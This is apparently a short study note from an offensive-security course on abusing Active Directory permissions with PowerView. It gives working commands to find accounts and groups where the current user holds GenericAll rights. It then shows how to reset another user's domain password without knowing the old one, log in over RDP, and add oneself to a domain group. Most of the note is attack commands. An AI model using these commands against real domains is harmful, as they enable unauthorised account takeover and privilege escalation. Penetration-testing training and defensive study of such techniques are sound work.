```
. .\powerview.ps1
Get-ObjectAcl -Identity offsec

```


Enumerate ActiveDirectoryRights:
```

Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

```

If `ActiveDirectoryRights = GericAll` of an account(such as `ObjectDN: CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com`), this mean, we have full access to `TestService1`.

We can change the user account password without knowing the old password:

```
net user testservice1 h4x /domain

```

Now we can login to that account:
```
mstsc /v:appsrv01 /prompt
```


We also can add ourselve to domain group if it has GenericAll right:

```

Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

```
![[Pasted image 20210702193029.png]]

Add our username to the group:
```
net group testgroup offsec /add /domain
```

